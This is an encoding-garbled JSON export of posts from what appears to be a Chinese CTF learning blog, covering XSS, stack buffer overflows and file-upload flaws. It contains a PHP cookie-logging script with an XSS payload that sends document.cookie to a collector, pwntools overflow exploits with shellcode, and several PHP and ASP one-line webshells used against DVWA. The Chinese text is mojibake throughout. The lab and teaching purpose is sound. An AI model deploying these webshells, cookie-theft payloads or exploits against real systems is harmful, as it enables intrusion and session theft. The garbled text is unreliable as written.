XSSç›—å–cookieæ”»å‡»åŸç†ï¼šé€šè¿‡XSSæ¼æ´ï¼Œåˆ©ç”¨ä¸€äº›jså‡½æ•°æ¥è·å–ç”¨æˆ·ä¿¡æ¯ã€‚ å…ˆåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾å…¥å¦‚ä¸‹phpæ–‡ä»¶ï¼š 1234&lt;?php $cookie = $_GET['cookie']; file_put_contents('cookie.txt', $cookie)?&gt; PHPæ–‡ä»¶ä¸­çš„&#39;å¾ˆå®¹æ˜“å’Œä¸­æ–‡çš„å•å¼•å·â€˜ææ··ã€‚ ä»¥ä¸‹ä¸ºXSSçš„payloadï¼š 1&lt;script&gt;document.location=\"http://127.0.0.1/dvwa/cookie.php?cookie=\"+document.cookie;&lt;/script&gt; è¾“å…¥payloadåï¼Œåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹cookie.txtä¸­å­˜å…¥äº†cookieçš„å€¼ã€‚ BeEFThe Browser Exploitation Frameworkï¼Œä¸€ä¸ªè‘—åçš„XSSåˆ©ç”¨æ¡†æ¶ï¼Œæ˜¯ä¸€ä¸ªäº¤äº’ç•Œé¢å‹å¥½ã€é«˜åº¦é›†æˆã€å¼€æºçš„ä¸€ä¸ªé¡¹ç›®ã€‚BeEFå¯ä»¥å’ŒMSFç»“åˆèµ·æ¥ä¸€èµ·ä½¿ç”¨ã€‚ PSï¼šMSFæ˜¯ä¸€ä¸ªå…è´¹çš„ã€å¯ä¸‹è½½çš„æ¡†æ¶ï¼Œé€šè¿‡å®ƒå¯ä»¥å¾ˆå®¹æ˜“åœ°è·å–ã€å¼€å‘å¹¶å¯¹è®¡ç®—æœºè½¯ä»¶æ¼æ´å®æ–½æ”»å‡»ã€‚å®ƒæœ¬èº«é™„å¸¦æ•°ç™¾ä¸ªå·²çŸ¥è½¯ä»¶æ¼æ´çš„ä¸“ä¸šçº§æ¼æ´æ”»å‡»å·¥å…·ã€‚ å¦‚ä½•ç”¨BeEFè¿›è¡Œå®¢æˆ·ç«¯åŠ«æŒï¼š åœ¨Kaliä¸‹æ‰“å¼€BeEF å¾—åˆ°ç®¡ç†ç•Œé¢çš„URLå’Œæ”»å‡»URL åˆ©ç”¨XSSæ¼æ´æ¥è®¿é—®æ”»å‡»çš„URL å‚è€ƒç½‘ç«™http://www.freebuf.com/articles/web/123779.htmlhttps://www.cnblogs.com/andy-zhou/p/5360107.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"PWNå…¥é—¨ï¼ˆäºŒï¼‰","slug":"PWNå…¥é—¨ï¼ˆäºŒï¼‰","date":"2018-07-07T05:23:05.000Z","updated":"2019-02-03T09:45:14.246Z","comments":true,"path":"2018/07/07/PWNå…¥é—¨ï¼ˆäºŒï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/07/07/PWNå…¥é—¨ï¼ˆäºŒï¼‰/","excerpt":"åˆæ¶‰PWNã€‚","text":"åˆæ¶‰PWNã€‚ å…³äºPWNåº•å±‚çš„åŸç†æ ˆå¸§å¹³è¡¡ä¸€äº›åŸºæœ¬å†…å®¹ï¼š ESPï¼šæ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢çš„æ ˆå¸§çš„æ ˆé¡¶ EBPï¼šåŸºå€æŒ‡é’ˆå¯„å­˜å™¨ï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢çš„æ ˆå¸§çš„åº•éƒ¨ å‡½æ•°æ ˆå¸§ï¼šESPå’ŒEBPä¹‹é—´å†…å­˜ç©ºé—´ä¸ºå½“å‰æ ˆå¸§ åœ¨å‡½æ•°æ ˆå¸§ä¸­ä¸€èˆ¬åŒ…å«ä»¥ä¸‹å‡ ç§ä¿¡æ¯ï¼š å±€éƒ¨å˜é‡ï¼šä¸ºå‡½æ•°ä¸¾æŠ¥å˜é‡å¼€è¾Ÿçš„å†…å­˜ç©ºé—´ æ ˆå¸§çŠ¶æ€å€¼ï¼šä¿å­˜å‰æ ˆå¸§çš„é¡¶éƒ¨å’Œåº•éƒ¨ï¼ˆå®é™…ä¸Šåªä¿å­˜å‰æ ˆå¸§çš„åº•éƒ¨ï¼Œå‰æ ˆå¸§çš„é¡¶éƒ¨å¯ä»¥é€šè¿‡å †æ ˆå¹³è¡¡å¾—åˆ°ï¼‰ å‡½æ•°è¿”å›åœ°å€ï¼šä¿å­˜å½“å‰å‡½æ•°è°ƒç”¨å‰çš„â€œæ–­ç‚¹â€ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯å‡½æ•°è°ƒç”¨å‰çš„æŒ‡ä»¤ä½ç½® å¦‚ä½•ä¿è¯æ ˆå¸§å¹³è¡¡ï¼š 1234567PUSH EBP // å°†æ ˆåº•æŒ‡é’ˆå­˜å…¥æ ˆï¼Œå³ä¿å­˜å½“å‰æ ˆå¸§çŠ¶æ€å€¼MOV EBP,ESP // å°†æ ˆé¡¶çš„å€¼èµ‹ç»™æ ˆåº•ï¼Œå³è®²å½“å‰æ ˆå¸§åˆ‡æ¢åˆ°æ–°æ ˆå¸§XXXXXX // å‡½æ•°ä¸­é—´éƒ¨åˆ†MOV ESP,EBP // å°†æ ˆåº•çš„å€¼èµ‹ç»™æ ˆé¡¶ï¼Œå³é™ä½æ ˆé¡¶ï¼Œå›é¦–å½“å‰æ ˆå¸§ç©ºé—´POP EBP // å¼¹å‡ºæ ˆåº•æŒ‡é’ˆï¼Œå³å°†å½“å‰æ ˆå¸§åº•éƒ¨ä¿å­˜çš„å‰æ ˆå¸§å€¼å¼¹å‡ºï¼Œæ¢å¤å‡ºä¸Šä¸€ä¸ªæ ˆå¸§ å‡½æ•°è¿”å›çš„æ­¥éª¤ï¼š ä¿å­˜è¿”å›å€¼ï¼Œé€šå¸¸å°†å‡½æ•°çš„è¿”å›å€¼ä¿å­˜åœ¨å¯„å­˜å™¨EAXä¸­ã€‚ å¼¹å‡ºå½“å‰å¸§ï¼Œæ¢å¤ä¸Šä¸€ä¸ªæ ˆå¸§ã€‚å…·ä½“åŒ…æ‹¬ï¼š åœ¨å †æ ˆå¹³è¡¡çš„åŸºç¡€ä¸Šï¼Œç»™ESPåŠ ä¸Šæ ˆå¸§çš„å¤§å°ï¼Œé™ä½æ ˆé¡¶ï¼Œå›æ”¶å½“å‰æ ˆå¸§çš„ç©ºé—´ã€‚ å°†å½“å‰æ ˆå¸§åº•éƒ¨ä¿å­˜çš„å‰æ ˆå¸§EBPå€¼å¼¹å…¥EBPå¯„å­˜å™¨ï¼Œæ¢å¤å‡ºä¸Šä¸€ä¸ªæ ˆå¸§ã€‚ å°†å‡½æ•°è¿”å›åœ°å€å¼¹ç»™EIPå¯„å­˜å™¨ã€‚ è·³è½¬ï¼šæŒ‰ç…§å‡½æ•°è¿”å›åœ°å€è·³å›æ¯å‡½æ•°ä¸­ç»§ç»­æ‰§è¡Œã€‚ PSï¼šæ ˆçš„å®ˆæŠ¤å¤©ä½¿â€”â€”GSï¼Œä¹Ÿç§°ä½œStack Canary/Cookie è°ƒç”¨å‡½æ•°ï¼ˆCallï¼‰CALLå¯ä»¥åŒ–ä¸ºä¸¤éƒ¨åˆ†ï¼Œå³Push retaddr + Jumpã€‚å…ˆè®²å‡½æ•°è¿”å›çš„åœ°å€å…¥æ ˆï¼Œå†è·³è½¬åˆ°å‡½æ•°æ‰§è¡Œçš„ä½ç½®å¤„ã€‚ è¿”å›å€¼ï¼ˆRetï¼‰RETä¹Ÿå¯ä»¥è½¬åŒ–ä¸ºä¸¤éƒ¨åˆ†ï¼Œå³Pop retaddr + Jumpã€‚å…ˆæ˜¯æŠŠè¿”å›å€¼çš„åœ°å€å‡ºæ ˆï¼Œå†è·³è½¬å›åŸæœ¬è°ƒç”¨å‡½æ•°å¤„ã€‚ ç¼“å†²åŒºæº¢å‡ºï¼ˆBuffer Overflowï¼‰ç¼“å†²åŒºæº¢å‡ºæ˜¯é’ˆå¯¹ç¨‹åºè®¾è®¡ç¼ºé™·ï¼Œå‘ç¨‹åºè¾“å…¥ç¼“å†²åŒºå†™å…¥ä½¿ä¹‹æº¢å‡ºçš„å†…å®¹ï¼Œä»è€Œç ´åç¨‹åºè¿è¡Œã€è¶è‘—ä¸­æ–­ä¹‹é™…å¹¶è·å–ç¨‹åºä¹ƒè‡³ç³»ç»Ÿçš„æ§åˆ¶æƒã€‚ ç¼“å†²åŒºæº¢å‡ºåŸæŒ‡å½“æŸä¸ªæ•°æ®è¶…è¿‡äº†å¤„ç†ç¨‹åºé™åˆ¶çš„èŒƒå›´æ—¶ï¼Œç¨‹åºå‡ºç°çš„å¼‚å¸¸æ“ä½œã€‚ å°¤å…¶æ˜¯Cè¯­è¨€ï¼Œä¸åƒå…¶ä»–ä¸€äº›é«˜çº§è¯­è¨€ä¼šè‡ªåŠ¨è¿›è¡Œæ•°ç»„æˆ–è€…æŒ‡é’ˆçš„è¾¹ç•Œæ£€æŸ¥ï¼Œå¢åŠ æº¢å‡ºé£é™©ã€‚Cè¯­è¨€ä¸­çš„Cæ ‡å‡†åº“è¿˜å…·æœ‰ä¸€äº›éå¸¸å±é™©çš„æ“ä½œå‡½æ•°ï¼Œä½¿ç”¨ä¸å½“ä¹Ÿä¸ºæº¢å‡ºåˆ›é€ æ¡ä»¶ã€‚ Linuxä¸‹çš„Pwnå¸¸ç”¨å‘½ä»¤ å‘½ä»¤ åŠŸèƒ½ cd è¿›å…¥æ–‡ä»¶å¤¹ ls åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ mkdir åˆ›å»ºæ–‡ä»¶å¤¹ pwd æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½• chmod æ”¹å˜æ–‡ä»¶ä½¿ç”¨æƒé™ objdump æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶æˆ–è€…å¯æ‰§è¡Œçš„ç›®æ ‡æ–‡ä»¶çš„æ„æˆ gdb ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯• checksec æ£€æµ‹äºŒè¿›åˆ¶çš„ä¿æŠ¤æœºåˆ¶æ˜¯å¦å¼€å¯ï¼ˆpedaä¸­çš„å‘½ä»¤ï¼‰ Linuxä¸‹çš„Pwnå¸¸ç”¨åˆ°çš„å·¥å…· gdbï¼šLinuxè°ƒè¯•ä¸­å¿…è¦ç”¨åˆ°çš„ gdb-pedaï¼šgdbæ–¹ä¾¿è°ƒè¯•çš„å·¥å…·ï¼Œç±»ä¼¼çš„å·¥å…·æœ‰gefï¼Œgdbinitï¼Œè¿™äº›å·¥å…·çš„å®‰è£…å¯ä»¥å‚è€ƒï¼šhttp://blog.csdn.net/gatieme/article/details/63254211 pwntoolsï¼šå†™expå’Œpocçš„åˆ©å™¨ checksecï¼šå¯ä»¥å¾ˆæ–¹ä¾¿çš„çŸ¥é“elfç¨‹åºçš„å®‰å…¨æ€§å’Œç¨‹åºçš„è¿è¡Œå¹³å° objdumpå’Œreadelfï¼šå¯ä»¥å¾ˆå¿«çš„çŸ¥é“elfç¨‹åºä¸­çš„å…³é”®ä¿¡æ¯ ida proï¼šå¼ºå¤§çš„åç¼–è¯‘å·¥å…· ROPgadgetï¼šå¼ºå¤§çš„ropåˆ©ç”¨å·¥å…· one_gadgetï¼šå¯ä»¥å¿«é€Ÿçš„å¯»æ‰¾libcä¸­çš„è°ƒç”¨exec(â€˜bin/shâ€™)çš„ä½ç½® libc-databaseï¼šå¯ä»¥é€šè¿‡æ³„éœ²çš„libcçš„æŸä¸ªå‡½æ•°åœ°å€æŸ¥å‡ºè¿œç¨‹ç³»ç»Ÿæ˜¯ç”¨çš„å“ªä¸ªlibcç‰ˆæœ¬ gdbåŸºæœ¬å‘½ä»¤ å‘½ä»¤ åŠŸèƒ½ start å¼€å§‹è°ƒè¯• pattc ç”Ÿæˆè§„å¾‹å­—ç¬¦ä¸² patto æŸ¥æ‰¾å­—ç¬¦ä¸² q é€€å‡º n æ‰§è¡Œä¸€è¡Œæºä»£ç ä½†ä¸è¿›å…¥å‡½æ•°å†…éƒ¨ ni æ‰§è¡Œä¸€è¡Œæ±‡ç¼–ä»£ç ä½†ä¸è¿›å…¥å‡½æ•°å†…éƒ¨ s æ‰§è¡Œä¸€è¡Œæºä»£ç è€Œä¸”è¿›å…¥å‡½æ•°å†…éƒ¨ si æ‰§è¡Œä¸€è¡Œæ±‡ç¼–ä»£ç è€Œä¸”è¿›å…¥å‡½æ•°å†…éƒ¨ c ç»§ç»­æ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ b ä¸‹æ–­ç‚¹ stack æ˜¾ç¤ºæ ˆä¿¡æ¯ x æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå†…å­˜æ•°æ® r è¿è¡Œä»£ç  PwntoolsåŸºæœ¬å‡½æ•° å‡½æ•° åŠŸèƒ½ process() sendline() å‘ç›®æ ‡å‘é€ä¸€è¡Œå­—ç¬¦ä¸² interactive() å®ç°å’Œç¨‹åºä¹‹é—´çš„äº¤äº’ remote() è¿œç¨‹è¿æ¥ context() è®¾ç½®è¿è¡Œæ—¶å˜é‡ p32()/p64() æŠŠæ•´æ•°è½¬åŒ–ä¸º32/64ä½çš„å­—ç¬¦ä¸² u32()/u64() æŠŠ32/64ä½å­—ç¬¦ä¸²è½¬åŒ–æˆæ•´æ•° asm()/disasm() å¿«é€Ÿæ±‡ç¼–/åæ±‡ç¼– log() è¾“å‡ºæ¶ˆæ¯ Pwnçš„å°ç»ƒä¹ ç¬¬ä¸€æ¬¡åšpwné¢˜ï¼Œè™½ç„¶æ˜¯åœ¨æœ‰æºç çš„æƒ…å†µä¸‹ã€‚ä½†æ˜¯è¿˜æ˜¯è¢«pwnçš„ç¥å¥‡æ‰€éœ‡æ’¼ã€‚ p1ç¨‹åºæºç ï¼š 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vmd()&#123; system(\"sh\");&#125;void A()&#123; char a[100]; scanf(\"%s\",a); return;&#125;int main()&#123; A();&#125; è¾“å…¥gcc p1.c -o p1 -m32ï¼Œç”¨æ¥ç¼–è¯‘32ä½çš„ç¨‹åºã€‚ ç›´æ¥è¦†ç›–è¿”å›åœ°å€æ ¹æ®æºæ–‡ä»¶å¯ä»¥åˆ¤æ–­è¯¥ç¨‹åºè°ƒç”¨A()å‡½æ•°æ—¶ï¼Œåœ¨scanfä¸­æ²¡æœ‰å¯¹å­—ç¬¦ä¸²çš„é•¿åº¦åšé™åˆ¶ï¼Œå³å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºã€‚ æ ¹æ®æºç ï¼Œæœ¬é¢˜çš„æ€è·¯åº”è¯¥ä¸ºé€šè¿‡ç¼“å†²åŒºæº¢å‡ºï¼Œå°†RETå¤„çš„åœ°å€ä¿®æ”¹ä¸ºcmd()å‡½æ•°çš„åœ°å€ï¼Œç›´æ¥è·³è½¬åˆ°è¯¥å‡½æ•°ågetshellã€‚æ•…å…ˆé€šè¿‡objdumpå‘½ä»¤å¯»æ‰¾åˆ°cmdå‡½æ•°çš„åœ°å€ ç„¶åè¾“å…¥gdb p1è¿›å…¥gdbè°ƒè¯•ç•Œé¢ã€‚startå¼€å§‹è°ƒè¯•ç¨‹åºã€‚ å·²çŸ¥åç§»é‡ä¸º112åï¼Œå®¹æ˜“çŸ¥é“å¯ä»¥ç›´æ¥é€šè¿‡æº¢å‡ºåœ¨RETå¤„è¦†ç›–åŸæœ¬çš„åœ°å€ï¼Œç›´æ¥è·³è‡³cmd()å‡½æ•°å¤„ã€‚ payloadå¦‚ä¸‹ï¼š 12345from pwn import *payload = \"A\" * 112 + \"\\x6b\\x84\\x04\\x08\"p = process(\"./p1\")p.sendline(payload)p.interactive() Ret_slideåœ¨ä¸çŸ¥é“è¿”å›åœ°å€åç§»æ—¶ï¼Œé€šè¿‡æ»‘ç¿”æœºï¼ˆRet_slideï¼‰è®¾ç½®payloadå‡å°‘å°è¯•æ¬¡æ•°ã€‚å³RETå‰çš„å­—ç¬¦ä¸²åˆ©ç”¨å…¶ä»–RETåœ°å€æ¥å¡«å……ã€‚ å› ä¸ºRETç›¸å½“äºPOPå’ŒJMPä¸¤ä¸ªæ­¥éª¤ï¼Œæ¯æ¬¡RETéƒ½ä¼šé‡æ–°è¿”å›åˆ°ä¸Šä¸€ä¸ªåœ°å€ï¼Œæœ€åæ‰§è¡Œåˆ°ç›®æ ‡åœ°å€æ—¶å°±ä¼šç›´æ¥è·³è½¬ã€‚ payloadï¼š 12345from pwn import *payload = \"\\x08\\x04\\x84\\xa0\" * 28 + \"\\x6b\\x84\\x04\\x08\"p = process(\"./p1\")p.sendline(payload)p.interactive() 3-13ç¨‹åºæºç ï¼š 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A()&#123; setvbuf(stdout, 0, _IONBF, 0); srand(time(0) ^ getpid()); char buf[100]; int magic = rand(); gets(buf); if (atoi(buf) == magic) &#123; puts(\"Okay...\"); system(\"sh\"); &#125;&#125;int main()&#123; A();&#125; åŒæ ·è¾“å…¥gcc 3-13.c -o 3-13 -m32æ¥ç¼–è¯‘ã€‚ è°ƒè¯•ä¸€å¼€å§‹å‘ç°æƒé™ä¸å¤Ÿï¼Œé€šè¿‡chmod +x 3-13æ¥è·å¾—å¯æ‰§è¡Œæƒé™ã€‚ æºä»£ç ä¸­ä½¿ç”¨äº†gets()å‡½æ•°ï¼Œå­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºï¼Œæ•…ç¬¬ä¸€ä¸ªæƒ³æ³•åº”è¯¥å°±æ˜¯é€šè¿‡å¯¹å˜é‡bufæ“ä½œä½¿å…¶è¦†ç›–å˜é‡magicçš„å€¼ï¼Œä½¿ä¸¤è€…ç›¸åŒåå¾—åˆ°shellã€‚ bufè¢«å®šä¹‰ä¸ºä¸€ä¸ªå 100å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œè€Œmagicè¢«å®šä¹‰ä¸ºä¸€ä¸ªå 4å­—èŠ‚çš„æ•´å‹ã€‚ æ ¹æ®è°ƒè¯•è¿‡ç¨‹å¯ä»¥çŸ¥é“ï¼Œbufçš„åœ°å€ä¸º0xffffcf68ï¼Œè€Œmagicçš„åœ°å€ä¸º0xffffcfccã€‚bufçš„åœ°å€æ¯”magicçš„åœ°å€æ›´ä½ï¼Œä¸¤è€…åœ¨æ ˆä¸­æ˜¾ç„¶æ˜¯å…ˆå‹å…¥magicå†å‹å…¥bufã€‚åˆå› ä¸ºè¾“å…¥æ•°æ®æ˜¯ä»ä½ä½å‘é«˜ä½è¾“å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å˜åŒ–bufçš„å€¼æ¥è¦†ç›–magicçš„å€¼ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¾ç„¶æ˜¯è®©ä¸¤è€…éƒ½ç­‰äºé›¶ã€‚ æ ¹æ®ä»¥ä¸Šçš„æ¨æµ‹ï¼Œé‚£ä¹ˆè¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦åº”å½“è‡³å°‘ä¸º100+4=104å­—èŠ‚æ‰å¯èƒ½å®Œå…¨è¦†ç›–å˜é‡magicã€‚ æ•…payloadä¸ºï¼š 12345from pwn import *p = process('./3-13')payload = '\\0' * 104p.sendline(payload)p.interactive() è¿™é‡Œçš„\\0ä¹Ÿå°±æ˜¯\\x00ï¼Œè€Œå¦‚æœè¾“å…¥çš„æ˜¯å­—ç¬¦0ï¼Œè½¬ä¸ºåå…­è¿›åˆ¶åä¸º\\x30ï¼Œå°†ä¸èƒ½æ»¡è¶³æ¡ä»¶ï¼Œæ— æ³•getshellã€‚ è¿™é¢˜é™„ä¸Šè€æ¢…çš„payloadï¼Œæ—¥åå†æ¥ç ”ç©¶ï¼š 123456789101112from pwn import *offset=116r=process(\"3-13\")elf=ELF(\"3-13\")bss=elf.bss()get=elf.symbols['gets']shell=\"\\xeb\\x1b\\x5f\\x31\\xc0\\x6a\\x53\\x6a\\x18\\x59\\x49\\x5b\\x8a\\x04\\x0f\\xf6\\xd3\\x30\\xd8\\x88\\x04\\x0f\\x50\\x85\\xc9\\x75\\xef\\xeb\\x05\\xe8\\xe0\\xff\\xff\\xff\\x1c\\x7f\\xc5\\xf9\\xbe\\xa3\\xe4\\xff\\xb8\\xff\\xb2\\xf4\\x1f\\x95\\x4e\\xfe\\x25\\x97\\x93\\x30\\xb6\\x39\\xb2\\x2c\"payload=\"A\"*offset+p32(get)+p32(bss)+p32(bss)r.sendline(payload)r.sendline(shell)r.sendline('/bin/sh')r.interactive() å‚è€ƒç½‘ç«™https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BAhttps://paper.seebug.org/481/https://bbs.pediy.com/thread-212691.htmhttp://blog.xiyoulinux.org/detail.jsp?id=1965http://www.cnitblog.com/houcy/archive/2013/03/16/87075.htmlhttps://blog.csdn.net/qq_29343201/article/details/51337025http://www.91ri.org/14382.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"WEBå…¥é—¨ï¼ˆä¸‰ï¼‰","slug":"WEBå…¥é—¨ï¼ˆä¸‰ï¼‰","date":"2018-07-06T01:04:22.000Z","updated":"2019-02-03T09:43:52.447Z","comments":true,"path":"2018/07/06/WEBå…¥é—¨ï¼ˆä¸‰ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/07/06/WEBå…¥é—¨ï¼ˆä¸‰ï¼‰/","excerpt":"ä»Šå¤©å­¦å§ä¸»è¦è®²äº†æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œäº†è§£äº†Cknifeç­‰å·¥å…·çš„ä½¿ç”¨ã€‚","text":"ä»Šå¤©å­¦å§ä¸»è¦è®²äº†æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œäº†è§£äº†Cknifeç­‰å·¥å…·çš„ä½¿ç”¨ã€‚ æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼ çš„æ–‡ä»¶ä¸è¿›è¡Œé™åˆ¶ï¼Œæœ‰å¯èƒ½ä¼šè¢«åˆ©ç”¨äºä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶ã€è„šæœ¬åˆ°æœåŠ¡å™¨ä¸Šï¼Œå¹¶ä¸”é€šè¿‡è„šæœ¬æ–‡ä»¶å¯ä»¥è·å¾—æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤çš„èƒ½åŠ› æœ¨é©¬æ ¹æ®è¯­è¨€åˆ†ç±»ï¼Œæœ‰PHPã€ASPã€JSPã€ASP.NETç­‰ä¸åŒè¯­è¨€ä¸‹çš„æœ¨é©¬ï¼›æ ¹æ®ä½œç”¨åˆ†ç±»ï¼Œæœ‰å¤§é©¬å’Œå°é©¬ã€‚ PHPä¸€å¥è¯æœ¨é©¬ï¼š ehco shell_exec($_GET['a']); ?>```1- ```&lt;?php ehco shell_exec($_POST[&apos;a&apos;]); ?&gt; @eval($_POST['a']); ?>```1234ASPä¸€å¥è¯æœ¨é©¬ï¼š- ```&lt;%eval request(&quot;Cknife&quot;)%&gt; ASP.NETä¸€å¥è¯æœ¨é©¬ï¼š Page Language12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273## åˆ©ç”¨å‡½æ•°1. shell_exec(): é€šè¿‡ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚2. eval(): æŠŠå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œæ‰§è¡Œaæ¥æ”¶åˆ°çš„å†…å®¹ã€‚## phpinfo()ä»‹ç»|å†…å®¹:-:|:-:è¯­æ³•|int phpinfo(void);è¿”å›å€¼|æ•´æ•°å‡½æ•°ç§ç±»|PHPç³»ç»ŸåŠŸèƒ½phpinfo()ä¼šæ³„æ¼å¾ˆå¤šæ•æ„Ÿçš„ä¿¡æ¯ã€‚1. ç»å¯¹è·¯å¾„ï¼ˆ_SERVER[&quot;script_FILENAME&quot;]ï¼‰æ‰¾åˆ°phpinfo()å¯ä»¥ç›´æ¥æ‰¾åˆ°ç½‘ç«™çš„ç»å¯¹è·¯å¾„ã€‚2. æ”¯æŒçš„ç¨‹åºå¯ä»¥æŸ¥çœ‹ä¸€äº›ç‰¹æ®Šçš„ç¨‹åºæœåŠ¡ï¼Œè¯¸å¦‚redisã€memcacheã€mysqlã€SMTPã€curlã€‚è¦æ˜¯æœåŠ¡å™¨è£…äº†redisæˆ–è€…memcacheï¼Œå°±å¯ä»¥é€šè¿‡ssrfæ¥getshellã€‚3. æ³„æ¼çœŸå®ipï¼ˆ_SERVER[&quot;SERVER_ADDR&quot;]æˆ–è€…SERVER_ADDRï¼‰å¾—åˆ°çš„ipå¯ä»¥ç›´æ¥ç”¨æ¥æŸ¥æ—ç«™å’Œcæ®µã€‚4. GOPHERå¦‚æœæ”¯æŒgopherä¹Ÿèƒ½ç›´æ¥ç”¨ssrfã€‚5. fastcgiæŸ¥çœ‹æ˜¯å¦å¼€å¯fastcgiå’ŒæŸ¥çœ‹fastcgiçš„ç‰ˆæœ¬ï¼Œå¯èƒ½å¯¼è‡´è§£ææ¼æ´ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€ä»»æ„æ–‡ä»¶è¯»å–ç­‰é—®é¢˜ã€‚6. æ³„æ¼ç¼“å­˜æ–‡ä»¶åœ°å€ï¼ˆ_FILES[&quot;file1&quot;]ï¼‰å‘phpinfo()postä¸€ä¸ªshellåï¼Œå¯ä»¥åœ¨&quot;_FILE[&quot;file1&quot;]&quot;ä¸­çœ‹åˆ°ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœæœ‰ä¸ªLFIï¼Œä¾¿å¯ä»¥ç›´æ¥getshellã€‚7. ä¸€äº›æ•æ„Ÿé…ç½®&gt; * allow_url_includeï¼šè¿œç¨‹æ–‡ä»¶åŒ…å«&gt; * disable_functionsï¼šæŸ¥çœ‹é‡‘åº¸å‡½æ•°&gt; * open_basedirï¼šè¯»å–ä¸€äº›æ²¡æƒé™çš„ç›®å½•è¿˜èƒ½è·å–ä¸€äº›ç¯å¢ƒä¿¡æ¯ï¼Œå¦‚environmentä¸­çš„pathã€logç­‰ã€‚## LinuxåŸºæœ¬å‘½ä»¤- lsï¼šåˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶- pwdï¼šæŸ¥çœ‹æ–‡ä»¶å½“å‰ç›®å½•# Cknifeï¼ˆèœåˆ€ï¼‰è¶…çº§å¼ºå¤§çš„ç½‘ç«™ç®¡ç†å·¥ï¼Œåˆ†ä¸ºå®¢æˆ·ç«¯å’Œä»£ç ä¸¤éƒ¨åˆ†åªè¦å°†é‚£ç®€çŸ­çš„ä¸€å¥è¯ä»£ç æ”¾åˆ°ç½‘ç«™ä¸Šå»å°±å¯ä»¥å–å¾—ç½‘ç«™çš„æƒé™è¿è¡Œç¯å¢ƒï¼šå®‰è£…äº†JRE1.7+ç¯å¢ƒçš„æ‰€æœ‰æ“ä½œç³»ç»Ÿä¸»è¦åŠŸèƒ½ï¼šæ–‡ä»¶ç®¡ç†ã€è™šæ‹Ÿç»ˆç«¯ã€æ•°æ®åº“ç®¡ç†## DVWAä¹‹File Uploadlow levelçš„æµ‹è¯•ä¸€ä¸‹ï¼Œæºç ä¸­æ²¡æœ‰å¯¹ä»»ä½•æ–‡ä»¶æ ¼å¼è¿›è¡Œè¿‡æ»¤ï¼š1. å†™å‡ºä¸€å¥è¯æœ¨é©¬ç”¨èœåˆ€è¿æ¥çš„ä¸€å¥è¯æœ¨é©¬ï¼š```php&lt;?php @eval($_POST[&apos;a&apos;]; ?&gt; ç›´æ¥åœ¨ç½‘é¡µä¸‹é€šè¿‡GETçš„ä¸€å¥è¯æœ¨é©¬ï¼š 1&lt;?php echo shell_exec($_GET['a']); ?&gt; åœ¨ç½‘é¡µä¸‹ç”¨hackbaré€šè¿‡POSTçš„ä¸€å¥è¯æœ¨é©¬ï¼š 1&lt;?php echo shell_exec($_POST['a']); ?&gt; ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ç›´æ¥åœ¨ç½‘é¡µæŸ¥åˆ°æ–‡ä»¶ Cknifeè¿æ¥ æºç ï¼š 123456789101112131415161718 &lt;?php if (isset($_POST['Upload'])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\"; //ä¸Šä¼ è·¯å¾„ä¸º../../hackable/uploads/ $target_path = $target_path . basename( $_FILES['uploaded']['name']); //ä¸Šä¼ è·¯å¾„åŠ ä¸Šä¸Šä¼ çš„æ–‡ä»¶å if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; //å¯¹æ˜¯å¦ä¸Šä¼ æˆåŠŸåšå‡ºåˆ¤æ–­ï¼Œå› æ­¤æ‰€æœ‰æ 